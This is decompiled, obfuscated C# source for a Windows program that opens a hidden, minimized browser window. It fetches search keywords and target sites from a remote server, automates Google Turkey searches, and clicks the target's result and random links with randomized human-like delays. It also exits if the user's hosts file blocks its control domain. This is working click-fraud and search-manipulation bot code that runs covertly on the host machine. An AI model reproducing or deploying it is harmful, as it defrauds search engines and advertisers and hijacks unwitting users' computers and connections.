using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BrowserDene;

public class Form1 : Form
{
	private const int int_0 = -20;

	private const int int_1 = 128;

	public bool gezdimi;

	private string string_0;

	private KeyValuePair<string, string> keyValuePair_0;

	private List<KeyValuePair<string, string>> list_0;

	private int int_2;

	private IContainer icontainer_0;

	private WebBrowser webBrowser1;

	private Timer timer_0;

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr window, int index, int value);

	[DllImport("user32.dll")]
	public static extern int GetWindowLong(IntPtr window, int index);

	[DllImport("winmm.dll")]
	public static extern int sndPlaySound(string lpszSoundName, int uFlags);

	public Form1()
	{
		Class4.mmSswkMzXYVws();
		list_0 = new List<KeyValuePair<string, string>>();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private static void smethod_0()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("http://www.nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}

	private void method_0(string string_1, string string_2, string string_3)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(string_1).Equals(string_2))
			{
				val.SetAttribute("value", string_3);
			}
		}
	}

	private void method_1(string string_1, string string_2)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(string_1).Equals(string_2))
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private bool method_2(string string_1)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		bool result = false;
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElement elementById = webBrowser1.get_Document().GetElementById("ires");
			HtmlElementCollection elementsByTagName = elementById.GetElementsByTagName("a");
			List<HtmlElement> list = new List<HtmlElement>();
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				string attribute = val.GetAttribute("href");
				if (!attribute.Contains("//webcache.googleusercontent.com") && !attribute.Contains("&amp;q=related:"))
				{
					list.Add(val);
				}
			}
			{
				foreach (HtmlElement item2 in list)
				{
					string attribute2 = item2.GetAttribute("href");
					if (attribute2.Contains(string_1))
					{
						item2.RaiseEvent("onmouseover");
						item2.RaiseEvent("onmousedown");
						item2.InvokeMember("click");
						return true;
					}
				}
				return result;
			}
		}
		return result;
	}

	public void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		string text = e.get_Url().ToString();
		Random random = new Random();
		if (text == "http://www.google.com.tr/" && keyValuePair_0.Value != "" && string_0 != "")
		{
			Timer val = new Timer();
			val.set_Interval(random.Next(1500, 3000));
			Timer val2 = val;
			val2.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_002c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0036: Expected O, but got Unknown
				method_1("name", "btnK");
				method_1("name", "btnG");
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			method_0("name", "q", keyValuePair_0.Key);
			val2.Start();
		}
		else if (text.StartsWith("http://www.google.com.tr/") && text.Contains("hl=tr"))
		{
			Timer val3 = new Timer();
			val3.set_Interval(random.Next(3000, 7000));
			Timer val4 = val3;
			val4.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_001a: Unknown result type (might be due to invalid IL or missing references)
				//IL_0025: Unknown result type (might be due to invalid IL or missing references)
				//IL_002f: Expected O, but got Unknown
				if (!method_2(keyValuePair_0.Value))
				{
					method_4();
				}
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			val4.Start();
		}
		else
		{
			if (!text.Contains(keyValuePair_0.Value) || text.StartsWith("http://www.google.com"))
			{
				return;
			}
			Timer val5 = new Timer();
			val5.set_Interval(random.Next(60000, 120000));
			Timer val6 = val5;
			val6.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_0016: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_002b: Expected O, but got Unknown
				if (!gezdimi)
				{
					method_3();
					gezdimi = true;
				}
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			val6.Start();
		}
	}

	private void method_3()
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		List<HtmlElement> list = new List<HtmlElement>(elementsByTagName.get_Count());
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute("target") != "_blank" && !string.IsNullOrEmpty(val.get_InnerText()))
			{
				list.Add(val);
			}
		}
		Random random = new Random();
		list[random.Next(list.Count - 1)].InvokeMember("click");
		list.Clear();
	}

	private void method_4()
	{
		switch (int_2)
		{
		case 6:
			method_8();
			break;
		case 7:
			method_7();
			break;
		case 8:
			method_6();
			break;
		case 9:
			method_5();
			break;
		}
	}

	private void method_5()
	{
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			webBrowser1.get_Document().GetElementById("pnnext").InvokeMember("click");
		}
	}

	private void method_6()
	{
		method_8();
	}

	private void method_7()
	{
		method_8();
	}

	private void method_8()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.get_OuterHtml().Contains("<B>Sonraki</B>"))
			{
				val.InvokeMember("click");
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		smethod_0();
		method_9();
		Class2.smethod_0();
		int windowLong = GetWindowLong(((Control)this).get_Handle(), -20);
		SetWindowLong(((Control)this).get_Handle(), -20, windowLong | 0x80);
		timer_0.set_Interval(new Random().Next(400000, 1500000));
		method_12();
	}

	private void method_9()
	{
		string text = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer")!.GetValue("Version")!.ToString();
		int_2 = int.Parse(text.Substring(0, 1));
	}

	private string method_10(string string_1)
	{
		string result = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using WebClient webClient2 = webClient;
		try
		{
			string input = webClient2.DownloadString(string_1);
			Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
			Match match = regex.Match(input);
			result = match.Groups[1].ToString();
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private void method_11()
	{
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using WebClient webClient2 = webClient;
		try
		{
			string text = webClient2.DownloadString("http://" + string_0 + "/v1/v1.php");
			string[] array = text.Split(new char[1] { '|' });
			KeyValuePair<string, string> item = new KeyValuePair<string, string>(array[0], array[1]);
			gezdimi = false;
			if (!list_0.Contains(item))
			{
				keyValuePair_0 = item;
				list_0.Add(keyValuePair_0);
				return;
			}
			timer_0.set_Enabled(false);
			Thread.Sleep(300000);
			method_11();
			timer_0.set_Enabled(true);
		}
		catch (Exception)
		{
		}
	}

	private void method_12()
	{
		string_0 = method_10("http://www.nurullahuzmez.com");
		method_11();
		webBrowser1.Navigate("http://www.google.com.tr");
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		method_12();
	}

	private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Expected O, but got Unknown
		icontainer_0 = new Container();
		webBrowser1 = new WebBrowser();
		timer_0 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser1).set_Size(new Size(863, 351));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		webBrowser1.add_NewWindow((CancelEventHandler)webBrowser1_NewWindow);
		timer_0.set_Enabled(true);
		timer_0.set_Interval(300000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(863, 351));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private void method_13(object sender, EventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		method_1("name", "btnK");
		method_1("name", "btnG");
		((Timer)sender).Stop();
		((Component)(Timer)sender).Dispose();
	}

	[CompilerGenerated]
	private void method_14(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		if (!method_2(keyValuePair_0.Value))
		{
			method_4();
		}
		((Timer)sender).Stop();
		((Component)(Timer)sender).Dispose();
	}

	[CompilerGenerated]
	private void method_15(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		if (!gezdimi)
		{
			method_3();
			gezdimi = true;
		}
		((Timer)sender).Stop();
		((Component)(Timer)sender).Dispose();
	}
}
